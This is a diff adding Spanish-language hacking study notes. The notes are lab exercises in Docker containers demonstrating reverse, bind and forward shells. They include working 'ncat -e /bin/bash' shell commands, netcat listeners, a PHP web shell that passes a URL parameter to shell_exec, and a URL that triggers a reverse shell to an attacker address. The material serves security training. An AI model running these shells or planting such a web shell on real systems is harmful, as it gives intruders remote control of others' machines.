@@ -1878,3 +1878,143 @@ nc ipVictima 4646 # Ganamos acceso a una bash
 * Forward Shell: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de mkfifo, que crea un archivo FIFO (named pipe), que se utiliza como una especie de “consola simulada” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, lo que permite la comunicación bidireccional con la máquina remota.
 
 Es importante entender las diferencias entre estas técnicas para poder determinar cuál es la mejor opción en función del escenario de ataque y las limitaciones de la red.
+
+```bash
+# Ejercicio Reverse Shell
+# Dos paneles
+# Panel de Victima
+nvim Dockerfile
+
+----- Dockerfile
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND noninteractive
+
+RUN apt-get update && apt-get install -y \
+    apache2 \ 
+    php \ 
+    ncat
+
+EXPOSE 80
+
+ENTRYPOINT service apache2 start && /bin/bash
+----- Dockerfile
+
+docker build -t my_image .
+docker images
+docker run -dit -p 80:80 --name myContainer my_image
+docker ps
+docker exec -it myContainer bash
+ncat -e /bin/bash localhost 443
+
+# Panel de atacante
+nc -nlvp 443
+nc -n # Para que no aplique resolucion DNS
+nc -l # Para ponernos en modo escucha
+nc -v # Verbose, para ver texto
+nc -p # Para indicar el puerto en el que nos vamos a poner por escucha
+
+whoami
+hostname -I
+script /dev/null -c bash # Para ver de mejor manera la consola
+```
+
+```bash
+# Ejercicio bind Shell
+# Dos paneles
+# Panel de Victima
+nvim Dockerfile
+
+----- Dockerfile
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND noninteractive
+
+RUN apt-get update && apt-get install -y \
+    apache2 \ 
+    php \ 
+    ncat
+
+EXPOSE 80
+
+ENTRYPOINT service apache2 start && /bin/bash
+----- Dockerfile
+
+docker build -t my_image .
+docker images
+docker run -dit -p 80:80 --name myContainer my_image
+docker ps
+docker exec -it myContainer bash
+
+ncat -nlvp 443 -e /bin/bash # Ofrecemos la bash por el puerto 443
+
+# Panel de atacante
+nc ipVictima 443 
+whoami
+hostname -I
+script /dev/null -c bash # Para ver de mejor manera la consola
+```
+
+```bash
+# Ejercicio Forward Shell
+# Dos paneles
+# Panel de Victima
+nvim Dockerfile
+
+----- Dockerfile
+FROM ubuntu:latest
+
+ENV DEBIAN_FRONTEND noninteractive
+
+RUN apt-get update && apt-get install -y \
+    apache2 \ 
+    php \ 
+    ncat \ 
+    iptables \ 
+    nano \ 
+    libapache2-mod-php \ 
+    net-tools
+
+EXPOSE 80
+
+ENTRYPOINT service apache2 start && /bin/bash
+----- Dockerfile
+
+docker build -t my_image .
+docker images
+docker run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my_image
+docker ps
+docker exec -it myContainer bash
+iptables --flush # Si da problemas no corriste bien la flag en el docker
+iptables -A OUTPUT -p tcp -m tcp -o eth0 -sport 80 -j ACCEPT
+iptables -A OUTPUT -o eth0 -j DROP
+
+
+
+
+# Panel de atacante
+docker port myContainer # Vemos el puerto expuesto, vamos al navegador para corrobora el apaches corriendo
+docker exec -it miContainer bash
+cd /var/www/html
+# suponemos que de alguna forma subimos un archivo php a este directorio
+nano cmd.php
+
+-----cmd.php
+<?php
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+-----cmd.php
+
+ls
+rm index.html
+nano /etc/php/8.1/apache2/php.ini
+ctrl + w # Para filtar por short_open_tag
+short_open_tag = On
+service apache2 restart
+# En el navegador damos clic en cmd.php
+# En la url hacamos lo siguiente
+localhost/cmd.php?cmd=whoami # Responde con www-data
+localhost/cmd.php?cmd=ncat -e /bin/bash ipAtacante 443 #Nos ponemos en escucha en cmd
+
+nc -nlvp 443 # No deberia estar entablando la conexión 
+```
